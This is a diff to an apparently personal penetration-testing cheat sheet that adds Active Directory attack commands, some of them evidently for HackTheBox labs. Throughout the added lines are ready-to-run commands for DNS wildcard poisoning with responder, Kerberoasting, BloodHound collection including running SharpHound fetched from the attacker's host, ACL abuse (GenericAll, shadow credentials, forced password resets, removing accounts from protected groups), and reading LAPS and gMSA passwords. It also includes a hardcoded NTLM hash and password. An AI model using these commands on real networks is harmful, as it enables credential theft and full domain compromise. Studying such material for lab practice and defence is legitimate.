@@ -751,7 +751,19 @@ sendemail \
         -a "$HOME"/.msf4/local/file.doc
 
 [*] (53) DNS
+[###] Domain Transfer
 dig axfr @$TARGET $DOM
+
+[###] Recon
+dnstool.py $TARGET -u '$DOM\$USERNAME' -p '$PASSWORD' --action query --record '@'
+
+[###] Wildcard Poisoning
+sudo responder -I tun0 -v
+dnstool.py $TARGET -u '$DOM\$USERNAME' -p '$PASSWORD' --action add --data $MYIP --record '*'
+
+[###] Injection
+sudo responder -I tun0 -v
+dnstool.py $TARGET -u '$DOM\$USERNAME' -p '$PASSWORD' --action add --data $MYIP --record 'localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA'
 
 [*] (79) Finger
 finger '$USERNAME'@$TARGET
@@ -759,8 +771,22 @@ while read -r user; do finger "$user"@$TARGET; done < usernames
 
 [*] (88) Kerberos
 [###] Generate .ccache
-impacket-getTGT -dc-ip $TARGET '$DOM/$USERNAME:$PASSWORD'
+(Ticket Granting Ticket)
+impacket-getTGT -dc-ip $TARGET '$DOM/$USERNAME:$PASSWORD'; kcme
 impacket-getTGT $DOM/'$USERNAME' -hashes :8846F7EAEE8FB117AD06BDD830B7586C; kcme
+
+[###] Clock Skew Sync
+sudo skewme $TARGET
+
+[###] Bloodhound
+(Download Data)
+nxc ldap $TARGET --dns-tcp --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --bloodhound -c all
+bloodhound-ce-python -u '$USERNAME' -k -no-pass -d $DOM -ns $TARGET -op $DC_$TARGET --zip -c All; unzip $DC*_bloodhound.zip -d /Upload/bloodhound
+\windows\tasks\Reflect.exe http://$MYIP/windows/Sharphound.exe -c all --ldapusername '$USERNAME' --ldappassword '$PASSWORD'
+
+(Usernames and Computers Wordlists)
+cat /Upload/bloodhound/*_users.json | jq -r '.. | .samaccountname? // empty' | tee usernames_$DC
+cat /Upload/bloodhound/*_computers.json | jq -r '.. | .samaccountname? // empty' | tee computers_$DC
 
 [###] Kerberoast
 impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -request
@@ -832,20 +858,78 @@ snmp-check $TARGET -c COMMUNITY_STRING -v 2c
 [###] Spray Service
 (hydra -I ldap2://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)
 
-[###] Domain: DC Hostname
+[###] Domain Information
+(DC Hostname)
 nmap -n -Pn $TARGET --script "ldap* and not brute" -p 389 | grep 'dnsHostName:' | cut -d ' ' -f9
 
-[###] Domain: SID
+(Domain SID)
 nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --get-sid
 
-[###] Visualise LDAP
-godap $TARGET -d $DOM -t ldap/$DC -k
+[###] Usernames and Computers
+impacket-GetADUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -all | awk '/---/{flag=1;next} flag && $1 ~ /^[A-Za-z]/ {print $1}' | awk NF | tr '[:upper:]' '[:lower:]' | tee usernames_$DC
+impacket-GetADComputers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass | awk '/---/{flag=1;next} flag && $1 ~ /^[A-Za-z]/ {print $1}' | awk NF | tr '[:upper:]' '[:lower:]' | tee computers_$DC
 
-[###] Trusted For Delegation
-nxc ldap $TARGET --dns-server $TARGET -u usernames -p passwords --continue-on-success --trusted-for-delegation
+[###] Add GenericAll
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add genericAll 'DistinguishedName' 'USER'
 
-[###] Other Attacks
+[###] Writable
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get writable --detail
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get object User | grep -Ei 'pass|pwd' | grep -vE 'bad|Last|Time' | cat
+
+[###] Delegation
+impacket-findDelegation -dc-host $DC $DOM/ -k -no-pass
+nxc ldap $TARGET --dns-server $TARGET -u $USERNAME -p $PASSWORD --trusted-for-delegation
+
+[###] ReadLAPSPassword
+impacket-GetLAPSPassword -dc-ip $TARGET $DOM/'$USERNAME:$PASSWORD' | awk '$1 ~ /\$$/ {print $1 " --> Administrator:" $3}'
+
+[###] ReadGMSAPassword
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get object 'SVC_ACC$' --attr msDS-ManagedPassword
+
+[###] Trust Account
 nxc ldap $TARGET -u '$USERNAME' -p '$PASSWORD' --query "(SAMAccountType=805306369)" "SAMAccountName" | awk '{print $6}' | grep '\$' > machines | sed 's/.$//' | tr '[:upper:]' '[:lower:]' > machines_pw; nxc smb $TARGET -u machines -p machines_pw | grep -oP '\[-\].*TRUST_ACCOUNT.*' | while read line; do echo -e "\e[1;33m$line <--- CHANGE PASSWORD NOW\!\e[0m"; done
+
+[###] Forest Trust
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get trusts
+
+[###] AddKeyCredentialLink
+certipy shadow auto -dc-ip $TARGET -target $DC -k -account 'SVC_CABACKUP'
+
+[###] AddSelf / Owns
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add groupMember 'DistinguishedName' '$USERNAME'; kcme
+
+[###] GenericWrite
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k set object 'DistinguishedName' servicePrincipalName -v 'http/anything'
+impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames
+certipy shadow auto -target $DC -u '$USERNAME' -k -account 'TargetUser'
+
+[###] ForceChangePassword
+impacket-changepasswd $DOM/'TARGET_USER'@$TARGET -newpass '123qweasdF!' -altuser 'USER_WITH_PRIV' -althash '89d0b56874f61ad38bad336a77b8ef2f' -reset
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k set password 'DistinguishedName' '123qweasdF!'
+impacket-getTGT $DOM/'$USERNAME:123qweasdF!'; kcme
+
+[###] Remove Protected
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k remove groupMember 'CN=PROTECTED OBJECTS,CN=USERS,DC=RUSTYKEY,DC=HTB' 'CN=IT,CN=USERS,DC=RUSTYKEY,DC=HTB'
+
+[###] Queries
+(Account Login Count)
+bloodyAD --dc-ip $TARGET --host $DC -k get search --filter '(&(objectClass=user)(logonCount>=1))' --attr sAMAccountName,logonCount | grep -v 'distinguishedName' | grep -vE "^\s*$" | cut -d' ' -f2- | python3 -c "import sys;from rich.table import Table;from rich.console import Console;l=sys.stdin.read().splitlines();t=Table(show_lines=False);t.add_column('sAMAccountName');t.add_column('logonCount');[t.add_row(l[i+1],l[i])for i in range(0,len(l),2)];Console().print(t)"
+
+(Computers and SIDs)
+bloodyAD --dc-ip $TARGET --host $DC -k get search --filter '(objectClass=computer)' --attr distinguishedName --attr objectSid | grep -vE "^\s*$" | cut -d' ' -f2- | python3 -c "from sys import stdin; from rich.table import Table; from rich.console import Console; l=stdin.read().splitlines(); t=Table(show_lines=False); t.add_column('DN'); t.add_column('SID'); [t.add_row(l[i],l[i+1]) for i in range(0,len(l),2)]; Console().print(t)"
+
+(Users and SIDs)
+bloodyAD --dc-ip $TARGET --host $DC -k get search --filter '(objectClass=user)' --attr distinguishedName --attr objectSid | grep -vE "^\s*$" | cut -d' ' -f2- | python3 -c "from sys import stdin; from rich.table import Table; from rich.console import Console; l=stdin.read().splitlines(); t=Table(show_lines=False); t.add_column('DN'); t.add_column('SID'); [t.add_row(l[i],l[i+1]) for i in range(0,len(l),2)]; Console().print(t)"
+
+(Groups and SIDs)
+bloodyAD --dc-ip $TARGET --host $DC -k get search --filter '(objectClass=group)' --attr 'distinguishedName' --attr 'objectSid' | grep -vE "^\s*$" | cut -d' ' -f2- | python3 -c "from sys import stdin; from rich.table import Table; from rich.console import Console; l=stdin.read().splitlines(); t=Table(show_lines=False); t.add_column('DN'); t.add_column('SID'); [t.add_row(l[i],l[i+1]) for i in range(0,len(l),2)]; Console().print(t)"
+
+(Users Belonging to Specific Group and SIDs)
+bloodyAD --dc-ip $TARGET --host $DC -k get search --filter '(objectClass=user)' --attr distinguishedName --attr objectSid | grep -B1 -A1 'Server Admins' | grep -vE "^\s*$" | cut -d' ' -f2- | python3 -c "from sys import stdin; from rich.table import Table; from rich.console import Console; l=stdin.read().splitlines(); t=Table(show_lines=False); t.add_column('DN'); t.add_column('SID'); [t.add_row(l[i],l[i+1]) for i in range(0,len(l),2)]; Console().print(t)"
+
+(Passwords and Keys)
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(objectClass=*))" | grep -a -Ei 'pass|pwd|key'
+
 
 [*] (445) SMB
 [###] Spray Service
